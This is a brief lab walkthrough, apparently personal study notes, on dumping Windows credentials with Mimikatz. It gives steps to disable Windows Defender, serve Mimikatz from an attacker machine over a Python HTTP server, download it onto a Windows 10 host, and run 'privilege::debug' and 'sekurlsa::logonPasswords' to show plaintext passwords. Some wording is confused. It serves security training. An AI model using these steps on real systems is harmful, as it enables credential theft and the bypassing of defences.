# Credential Dumping with Mimikatz

enter "mimikatz" in all apps to check if kali have it.&#x20;

turn of both win server 2019 and win server 10 enterprise

in win 10 ent Check if network sharing is on in file explorer (must be turn on to perform this attack. )

Turn off win defender and real time protection.&#x20;

In the mimikatz's terminal, enter "python3 -m http.server 80" and turn of the server.&#x20;

in win 10 ent&#x20;

1. open browser then type attacker ip then goto x64 then download 4 file in it. ignore the warnings.
2.  run cmd as admin with admin username and pass and navigate to the 4 files directory and run the mimikatz.exe&#x20;

    <img src=".gitbook/assets/image (8).png" alt="" data-size="original">
3. Now enter "privilege::" to see options under it.&#x20;
4. enter "privilege::debug"
5.  enter "sekurlsa::" to see options under it.&#x20;

    <figure><img src=".gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>
6. enter "sekurlsa::logonPasswords" to see plain text password.&#x20;
